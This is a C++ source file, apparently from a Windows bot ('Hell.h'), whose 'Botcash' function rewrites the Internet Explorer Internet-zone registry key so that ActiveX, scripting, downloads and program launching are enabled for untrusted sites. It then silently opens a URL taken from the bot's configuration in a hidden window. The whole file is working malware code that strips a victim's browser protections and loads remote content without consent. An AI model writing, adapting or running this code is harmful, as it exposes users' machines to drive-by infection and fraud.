// here you go!! ;)

#include "Include.h"
#include "Hell.h"

void Botcash()
{
	DWORD x = 00000000;
	DWORD y = 00000001;
	HKEY hRegKey;
	RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\3", &hRegKey);
	RegSetValueEx(hRegKey,"CurrentLevel",NULL,REG_DWORD,(LPBYTE) &y,sizeof(DWORD));
	RegSetValueEx(hRegKey,"Flags",NULL,REG_DWORD,(LPBYTE) &y,sizeof(DWORD));
	RegSetValueEx(hRegKey,"1001",NULL,REG_DWORD,(LPBYTE) &x,sizeof(DWORD));
	RegSetValueEx(hRegKey,"1004",NULL,REG_DWORD,(LPBYTE) &x,sizeof(DWORD));
	RegSetValueEx(hRegKey,"1200",NULL,REG_DWORD,(LPBYTE) &x,sizeof(DWORD));
	RegSetValueEx(hRegKey,"1201",NULL,REG_DWORD,(LPBYTE) &x,sizeof(DWORD));
	RegSetValueEx(hRegKey,"1206",NULL,REG_DWORD,(LPBYTE) &x,sizeof(DWORD));
	RegSetValueEx(hRegKey,"1400",NULL,REG_DWORD,(LPBYTE) &x,sizeof(DWORD));
	RegSetValueEx(hRegKey,"1402",NULL,REG_DWORD,(LPBYTE) &x,sizeof(DWORD));
	RegSetValueEx(hRegKey,"1405",NULL,REG_DWORD,(LPBYTE) &x,sizeof(DWORD));
	RegSetValueEx(hRegKey,"1406",NULL,REG_DWORD,(LPBYTE) &x,sizeof(DWORD));
	RegSetValueEx(hRegKey,"1407",NULL,REG_DWORD,(LPBYTE) &x,sizeof(DWORD));
	RegSetValueEx(hRegKey,"1601",NULL,REG_DWORD,(LPBYTE) &x,sizeof(DWORD));
	RegSetValueEx(hRegKey,"1604",NULL,REG_DWORD,(LPBYTE) &x,sizeof(DWORD));
	RegSetValueEx(hRegKey,"1605",NULL,REG_DWORD,(LPBYTE) &x,sizeof(DWORD));
	RegSetValueEx(hRegKey,"1606",NULL,REG_DWORD,(LPBYTE) &x,sizeof(DWORD));
	RegSetValueEx(hRegKey,"1607",NULL,REG_DWORD,(LPBYTE) &x,sizeof(DWORD));
	RegSetValueEx(hRegKey,"1608",NULL,REG_DWORD,(LPBYTE) &x,sizeof(DWORD));
	RegSetValueEx(hRegKey,"1609",NULL,REG_DWORD,(LPBYTE) &x,sizeof(DWORD));
	RegSetValueEx(hRegKey,"1800",NULL,REG_DWORD,(LPBYTE) &x,sizeof(DWORD));
	RegSetValueEx(hRegKey,"1802",NULL,REG_DWORD,(LPBYTE) &x,sizeof(DWORD));
	RegSetValueEx(hRegKey,"1803",NULL,REG_DWORD,(LPBYTE) &x,sizeof(DWORD));
	RegSetValueEx(hRegKey,"1804",NULL,REG_DWORD,(LPBYTE) &x,sizeof(DWORD));
	RegSetValueEx(hRegKey,"1805",NULL,REG_DWORD,(LPBYTE) &y,sizeof(DWORD));
	RegSetValueEx(hRegKey,"1A00",NULL,REG_DWORD,(LPBYTE) &x,sizeof(DWORD));
	RegSetValueEx(hRegKey,"1A02",NULL,REG_DWORD,(LPBYTE) &x,sizeof(DWORD));
	RegSetValueEx(hRegKey,"1A03",NULL,REG_DWORD,(LPBYTE) &x,sizeof(DWORD));
	RegSetValueEx(hRegKey,"1A04",NULL,REG_DWORD,(LPBYTE) &x,sizeof(DWORD));
	RegSetValueEx(hRegKey,"1A05",NULL,REG_DWORD,(LPBYTE) &x,sizeof(DWORD));
	RegSetValueEx(hRegKey,"1A06",NULL,REG_DWORD,(LPBYTE) &x,sizeof(DWORD));
	RegSetValueEx(hRegKey,"1A10",NULL,REG_DWORD,(LPBYTE) &y,sizeof(DWORD));
	RegSetValueEx(hRegKey,"2001",NULL,REG_DWORD,(LPBYTE) &x,sizeof(DWORD));
	RegSetValueEx(hRegKey,"2004",NULL,REG_DWORD,(LPBYTE) &x,sizeof(DWORD));
	Sleep(5000);
	char t[1024];
    sprintf(t, "explorer %s", Hell->hDownload.sBotcash.c_str());
    WinExec(t,SW_HIDE);
}